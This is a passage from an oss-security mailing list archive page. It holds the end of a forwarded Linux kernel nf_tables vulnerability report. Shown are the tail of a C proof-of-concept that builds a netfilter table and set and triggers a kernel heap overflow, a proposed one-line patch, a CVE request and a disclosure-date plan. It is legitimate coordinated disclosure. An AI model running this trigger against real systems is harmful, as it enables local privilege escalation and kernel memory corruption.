&gt; 
&gt; ??? /* Free allocated memory */
&gt; ??? free(nlh_batch_end);
&gt; ??? free(nlh_payload);
&gt; ??? free(nlh_batch_begin);
&gt; }
&gt; 
&gt; int main(int argc, char **argv) {
&gt; 
&gt; ??? int sock;
&gt; ??? struct sockaddr_nl snl;
&gt; ??? struct leak *bases;
&gt; 
&gt; ??? new_ns();
&gt; ??? printf("[+] Get CAP_NET_ADMIN capability\n");
&gt; 
&gt; ??? /* Netfilter netlink socket creation */
&gt; ??? if ((sock = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_NETFILTER)) &lt; 0) {
&gt; ??????? do_error_exit("socket");
&gt; ??? }
&gt; ??? printf("[+] Netlink socket created\n");
&gt; 
&gt; ??? // Binding
&gt; ??? memset(&amp;snl, 0, sizeof(snl));
&gt; ??? snl.nl_family = AF_NETLINK;
&gt; ??? snl.nl_pid = getpid();
&gt; ??? if (bind(sock, (struct sockaddr *)&amp;snl, sizeof(snl)) &lt; 0) {
&gt; ??????? do_error_exit("bind");
&gt; ??? }
&gt; ??? printf("[+] Netlink socket bound\n");
&gt; 
&gt; ??? /* Create a netfilter table */
&gt; ??? create_table(sock, TABLE);
&gt; ??? printf("[+] Table created\n");
&gt; 
&gt; ??? /*? Create a netfilter set */
&gt; ??? create_set(sock, SET_NAME, KMALLOC64_KEYLEN, BUFFER_SIZE, TABLE, ID);
&gt; ??? printf("[+] Set created\n");
&gt; 
&gt; ??? /* Prepare the payload for the write primitive */
&gt; ??? add_elem_to_set(sock, SET_NAME, KMALLOC64_KEYLEN, TABLE, ID, 
&gt; BUFFER_SIZE, buffer);
&gt; ??? printf("[+] Overflow done\n");
&gt; 
&gt; ??? return EXIT_SUCCESS;
&gt; }
&gt; ```
&gt; 
&gt; We propose the following patch. We think that the comparison must be 
&gt; mandatory and may be enough for patch this vulnerability.
&gt; However, we are not experts at Linux kernel programming and we are still 
&gt; unsure if it will not break something along the way.
&gt; This patch was applied on the current upstream version.
&gt; 
&gt; ```diff
&gt; static int nft_setelem_parse_data(struct nft_ctx *ctx, struct nft_set *set,
&gt; ????????????????? struct nft_data_desc *desc,
&gt; ????????????????? struct nft_data *data,
&gt; ????????????????? struct nlattr *attr)
&gt; {
&gt; 
&gt; ??? ...
&gt; 
&gt; -??? if (desc-&gt;type != NFT_DATA_VERDICT &amp;&amp; desc-&gt;len != set-&gt;dlen) {
&gt; +??? if (desc-&gt;len != set-&gt;dlen) {
&gt; 
&gt; ?? ???? ??? ??? nft_data_release(data, desc-&gt;type);
&gt; ??????? return -EINVAL;
&gt; ??? }
&gt; 
&gt; ??? return 0;
&gt; }
&gt; ```
&gt; 
&gt; We would like to reserve a CVE for this vulnerability.
&gt; 
&gt; Also, we would like to release the LPE exploit targeting Ubuntu server 
&gt; along with a more detailed blogpost.
&gt; If needed, we can supply the exploit. Depending of your workload, we can 
&gt; suggest the August, 15th 2022 as a potential date for public disclosure.
&gt; 
&gt; Thank you for your attention and we also would like to thank you for all 
&gt; the work put on the Linux kernel.
&gt; 
&gt; ----- End forwarded message -----
</pre>
<p><a href="https://www.openwall.com/blists/">Powered by blists</a> - <a href="https://lists.openwall.net">more mailing lists</a>


<p>
Please check out the
<a href="https://oss-security.openwall.org/wiki/">
Open Source Software Security Wiki</a>, which is counterpart to this
<a href="https://oss-security.openwall.org/wiki/mailing-lists/oss-security">mailing list</a>.
<p>
Confused about <a href="/lists/">mailing lists</a> and their use?
<a href="https://en.wikipedia.org/wiki/Electronic_mailing_list">Read about mailing lists on Wikipedia</a>
and check out these
<a href="https://www.complang.tuwien.ac.at/anton/mail-news-errors.html">guidelines on proper formatting of your messages</a>.
<p>

</body>
</html>
